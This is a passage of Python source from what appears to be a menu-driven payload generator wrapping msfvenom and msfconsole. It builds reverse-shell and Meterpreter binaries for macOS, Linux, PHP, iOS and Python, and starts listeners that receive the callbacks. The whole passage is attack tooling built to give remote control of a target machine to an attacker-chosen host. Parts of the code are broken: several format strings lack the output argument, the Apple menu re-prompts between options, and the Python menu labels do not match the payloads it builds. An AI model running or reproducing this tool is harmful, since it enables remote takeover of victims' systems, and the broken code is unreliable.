    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/ppc/shell_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crosxget == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/ppc/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/ppc/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  else:
    slowprint2(colors.red + "[!] Wrong Choice [!]")
    time.sleep(2)


  if crosxget == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/x64/meterpreter/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crosxget == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/x64/meterpreter_reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()



  if crosxget == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/x64/meterpreter_reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crosxget == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/x64/meterpreter_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crosxget == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/armle/execute/reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/armle/execute/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crosxget == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/armle/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/armle/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crosxget == "9":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/armle/shell_reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    osxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if osxlis == "Yes" or osxlis == "yes" or osxlis == "y" or osxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "osx/armle/shell_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  else:
    menu()

def crlinux():
  start()
  pubip()
  slowprint(colors.green + """
[1]  linux/x86/shell/reverse_tcp
[2]  linux/x86/meterpreter_reverse_http
[3]  linux/x86/meterpreter_reverse_https
[4]  linux/x86/meterpreter_reverse_tcp
[5]  linux/x64/shell/reverse_tcp
[6]  linux/x64/meterpreter_reverse_http
[7]  linux/x64/meterpreter_reverse_https
[8]  linux/x64/meterpreter_reverse_tcp

[00] Back

""")
  crlinuxget = str(input("\033[37m[\033[31m+\033[37m] Linux > "))
  if crlinuxget  == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x86/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crlinuxget  == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.elf".format(host,port))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x86/meterpreter_reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()



  if crlinuxget  == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.elf".format(host,port))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x86/meterpreter_reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()




  if crlinuxget  == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x86/meterpreter_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()



  if crlinuxget  == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x64/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()




  if crlinuxget  == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.elf".format(host,port))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x64/meterpreter_reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()




  if crlinuxget  == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.elf".format(host,port))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x64/meterpreter_reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()




  if crlinuxget  == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform linux -f elf -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.elf".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    linuxlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if linuxlis == "Yes" or linuxlis == "yes" or linuxlis == "y" or linuxlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "linux/x64/meterpreter_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  else:
    menu()



def crphp():
  start()
  pubip()
  slowprint(colors.green + """
[1]  php/meterpreter/reverse_tcp

[00] Back

""")
  crphpget = str(input("\033[37m[\033[31m+\033[37m] PHP > "))
  if crphpget  == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform php -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o {2}.php".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    phplis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if phplis == "Yes" or phplis == "yes" or phplis == "y" or phplis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "php/meterpreter/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()
  


def crapple():
  start()
  pubip()
  slowprint(colors.green + """
[1]  apple_ios/aarch64/meterpreter_reverse_http
[2]  apple_ios/aarch64/meterpreter_reverse_https
[3]  apple_ios/aarch64/meterpreter_reverse_tcp
[4]  apple_ios/aarch64/shell_reverse_tcp

[00] Back

""")

  crappleget = str(input("\033[37m[\033[31m+\033[37m] Apple > "))
  if crappleget  == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    applelis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if applelis == "Yes" or applelis == "yes" or applelis == "y" or applelis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "apple_ios/aarch64/meterpreter_reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()
  
  crappleget = str(input("Apple > "))
  if crappleget  == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    applelis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if applelis == "Yes" or applelis == "yes" or applelis == "y" or applelis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "apple_ios/aarch64/meterpreter_reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()


  crappleget = str(input("Apple > "))
  if crappleget  == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    applelis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if applelis == "Yes" or applelis == "yes" or applelis == "y" or applelis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "apple_ios/aarch64/meterpreter_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()


  if crappleget  == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform apple_ios -f macho -p apple_ios/aarch64/shell_reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    applelis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if applelis == "Yes" or applelis == "yes" or applelis == "y" or applelis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "apple_ios/aarch64/shell_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()
  
def crpython():
  start()
  pubip()
  slowprint(colors.green + """
[1]  python/meterpreter/reverse_tcp
[2]  python/shell_reverse_tcp

[00] Back

""")
  crpythonget = str(input("\033[37m[\033[31m+\033[37m] Python > "))
  if crpythonget  == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform python -f raw -p python/meterpreter/reverse_http LHOST={0} LPORT={1} -o {2}.py".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    pythonlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if pythonlis == "Yes" or pythonlis == "yes" or pythonlis == "y" or pythonlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "python/meterpreter/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "############################ Starting Listner Failed ############################")
      menu()
  
  if crpythonget  == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform python -f raw -p python/meterpreter/reverse_https LHOST={0} LPORT={1} -o {2}.py".format(host,port,outp))
    print("\n")
    slowprint2(colors.green + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.whit + "##################################### Done #####################################")
    print("\n")
    pythonlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if pythonlis == "Yes" or pythonlis == "yes" or pythonlis == "y" or pythonlis == "Y":
      print("\n")
      slowprint2(colors.green + "############################# Starting Listner #############################")
      pay = "python/meterpreter/reverse_https"
